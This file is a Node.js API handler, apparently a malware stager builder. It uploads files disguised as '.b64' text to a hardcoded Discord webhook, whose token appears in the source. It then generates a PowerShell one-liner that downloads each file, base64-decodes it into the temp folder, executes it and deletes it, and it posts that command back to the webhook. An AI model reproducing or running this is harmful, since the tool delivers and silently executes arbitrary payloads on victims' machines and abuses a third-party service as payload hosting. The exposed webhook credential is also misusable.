const https = require('https');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

const handler = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(200).json({ ok: true, msg: 'API is running' });

  try {
    const { files } = req.body;
    if (!files || !files[0]) return res.status(400).json({ success: false, error: 'No files provided' });

    const uploadResults = [];
    
    for (const file of files) {
      const encodedName = file.filename.replace(/\.[^/.]+$/, '') + '.b64';
      const boundary = '----Boundary' + Math.random().toString(36).substring(2);
      
      const payload = Buffer.concat([
        Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
        Buffer.from(file.content, 'base64'),
        Buffer.from(`\r\n--${boundary}--\r\n`)
      ]);

      const uploadedUrl = await new Promise((resolve, reject) => {
        const url = new URL(DISCORD_WEBHOOK);
        const discordReq = https.request({
          hostname: url.hostname,
          path: url.pathname,
          method: 'POST',
          headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': payload.length
          }
        }, dRes => {
          let dData = '';
          dRes.on('data', chunk => dData += chunk);
          dRes.on('end', () => {
            try {
              const j = JSON.parse(dData);
              if (j.attachments?.[0]?.url) resolve(j.attachments[0].url);
              else reject(new Error('Discord upload failed: ' + dData));
            } catch (e) { reject(new Error('Invalid Discord response')); }
          });
        });
        discordReq.on('error', reject);
        discordReq.write(payload);
        discordReq.end();
      });

      uploadResults.push({ url: uploadedUrl, name: file.filename });
    }

    let cmd = '';
    if (uploadResults.length === 1) {
      const r = uploadResults[0];
      cmd = `powershell -c "$t=\\"$env:TEMP\\${r.name}\\";$u='${r.url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u).Trim().Trim('\\"')));Start-Process $t -Wait;Remove-Item $t"`;
    } else {
      let varDefs = [], cmdParts = [], startParts = [], tVars = [];
      uploadResults.forEach((r, i) => {
        const idx = i + 1;
        varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.name}\\"`, `$u${idx}='${r.url}'`);
        cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx}).Trim().Trim('\\"')))`);
        startParts.push(`Start-Process $t${idx} -Wait`);
        tVars.push(`$t${idx}`);
      });
      cmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
    }

    // Send Discord notification
    const wh = https.request(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
    wh.write(JSON.stringify({
      content: `📁 **${uploadResults.map(r => r.name).join(', ')}**\n\`\`\`powershell\n${cmd}\n\`\`\``
    }));
    wh.end();

    return res.status(200).json({ success: true, command: cmd });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ success: false, error: err.message });
  }
};

handler.config = {
  api: {
    bodyParser: {
      sizeLimit: '4.5mb',
    },
  },
};

module.exports = handler;
